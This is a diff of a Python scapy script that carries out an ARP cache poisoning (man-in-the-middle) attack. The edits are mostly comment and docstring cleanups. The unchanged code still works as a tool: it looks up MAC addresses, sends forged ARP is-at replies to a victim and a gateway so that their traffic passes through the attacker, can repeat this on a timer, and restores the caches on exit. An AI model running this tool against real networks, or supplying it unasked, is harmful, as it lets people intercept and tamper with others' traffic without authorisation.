@@ -34,7 +34,7 @@ import argparse
 
 def banner():
     """
-        Display the script banner
+    Display the script banner
     """
     print("""\x1b[33m                                                 _____             
 _____ _____________  ____________   ____   _____/ ____\\___________ 
@@ -50,7 +50,6 @@ _____ _____________  ____________   ____   _____/ ____\\___________
 
 
 def parse_args():
-
     """
         Parses the CLI given arguments
         Returns the gateway IP, target IP, Interface Name and delay
@@ -69,12 +68,15 @@ def parse_args():
 
 def get_mac(ip: str) -> str:
     """
-        [0]    ->  "Answered" requests
-        [0]    ->  Get the first response
-        [1]    ->  Get the answer part
-        .hwsrc ->  Get the src mac of the responder
+    Retrieve MAC address from IP by performing an ARP who-has request.
     """
+
     sleep(1) # Tamper the attack
+        
+    # [0]    ->  "Answered" requests
+    # [0]    ->  Get the first response
+    # [1]    ->  Get the answer part
+    # .hwsrc ->  Get the src mac of the responder
     return srp(
         Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=ip), timeout=4, verbose=False
     )[0][0][1].hwsrc
@@ -82,33 +84,38 @@ def get_mac(ip: str) -> str:
 
 class ACP:
     def __init__(self, gateway_ip: str, victim_ip: str, attacker_mac: str, attacker_ip: str, delay: int) -> None:
+        # Initialize first victim ip and mac
         self.gateway_ip = gateway_ip 
         self.gateway_mac = get_mac(self.gateway_ip)
-        
+
+        # Initialize second victim ip and mac
         self.victim_ip = victim_ip 
         self.victim_mac = get_mac(self.victim_ip)
-        
+
+        # Initialize attacker ip and mac
         self.attacker_ip = attacker_ip
         self.attacker_mac = attacker_mac
         self.delay = delay
 
-    def show_mac(self) -> None:
 
+    def show_mac(self) -> None:
+        """
+        Display first victim, second victim and attacker IP/MAC combination in a nice format
+        """
         log.info(f"You     : \x1b[1m\x1b[35m[\x1b[0m {self.attacker_ip}\x1b[0m \x1b[1m\x1b[35m][ \x1b[0m{self.attacker_mac}\x1b[0m \x1b[1m\x1b[35m]\x1b[0m")
         log.info(f"Target  : \x1b[1m\x1b[35m[\x1b[0m {self.victim_ip}\x1b[0m \x1b[1m\x1b[35m][ \x1b[0m{self.victim_mac}\x1b[0m \x1b[1m\x1b[35m]\x1b[0m")
         log.info(f"Gateway : \x1b[1m\x1b[35m[\x1b[0m {self.gateway_ip}\x1b[0m \x1b[1m\x1b[35m][ \x1b[0m{self.gateway_mac}\x1b[0m \x1b[1m\x1b[35m]\x1b[0m")
         
         print()
 
+
     def show_is_at(self, target_ip1: str, target_ip2: str, mac_address: str) -> None:
         log.success(f"ARP \x1b[33m{target_ip1}\x1b[0m is-at \x1b[33m{mac_address}\x1b[0m sent to \x1b[33m{target_ip2}\x1b[0m")
 
+
     def send_is_at(self, dst_ip: str, dst_mac: str, src_ip: str, src_mac: str) -> None:
         """
-        Perform an ARP cache poisoning attack by sending a fraudulent ARP reply (is-at) to the victim.
-        
-        The goal is to associate the attacker's MAC address (attacker_mac) with the IP address spoofed_ip, 
-        tricking the target (target_ip) into sending traffic through the attacker. 
+        Send an is-at ARP reply
         """
 
         sendp(ARP(
@@ -119,7 +126,13 @@ class ACP:
             hwsrc=src_mac,      # Source MAC (Our mac address)
         ), verbose=False )
 
+
     def poison_arp(self) -> None:
+        """
+        Perform an ARP cache poisoning attack by sending a fraudulent ARP reply (is-at) to the victim.
+        """
+
+        # Trick the victim 
         self.send_is_at(
             dst_ip=self.victim_ip, 
             dst_mac=self.victim_mac, 
@@ -128,6 +141,7 @@ class ACP:
         )
         self.show_is_at(self.gateway_ip, self.victim_ip, self.attacker_mac)
 
+        # Trick the gateway
         self.send_is_at(
             dst_ip=self.gateway_ip,     
             dst_mac=self.gateway_mac, 
@@ -136,37 +150,45 @@ class ACP:
         )
         self.show_is_at(self.victim_ip, self.gateway_ip, self.attacker_mac)
 
+
     def restore_arp(self) -> None:
+        """
+        Restore ARP table by sending an unspoofed is-at request to the two victims
+        """
+        # Restore victim ARP cache
         self.send_is_at(
             dst_ip=self.victim_ip,
             dst_mac=self.victim_mac,
             src_ip=self.gateway_ip,
             src_mac=self.gateway_mac,
         )
+        # Restore gateway ARP cache
         self.send_is_at(
             dst_ip=self.gateway_ip,     
             dst_mac=self.gateway_mac, 
             src_ip=self.victim_ip,
             src_mac=self.victim_mac,
         )
-    
+
+
     def run(self):
-        # Show
+        # Show mac addresses
         self.show_mac()
 
-        # Send only 1 packet
+        # Send 1 is-at reply
         if(delay == 0):
             self.poison_arp()
             self.restore_arp()
         else:
+            # Send is-at replies every delay second
             while True:
                 self.poison_arp()
                 log.info(f"Sleeping {delay} sec\n\n")
                 sleep(delay)
 
-      
-if __name__ == "__main__":
-    
+
+
+if __name__ == "__main__":    
     banner()
 
     gateway_ip, victim_ip, delay, iname = parse_args()
@@ -182,7 +204,6 @@ if __name__ == "__main__":
         gathering.success("ok")
        
         acp.run()
-
     except PermissionError:
         log.critical("This script must be run as root")
     except IndexError:
@@ -192,4 +213,3 @@ if __name__ == "__main__":
         print()
         log.success("Received ^C, restoring ARP cache and exiting")
         acp.restore_arp()
-        exit()
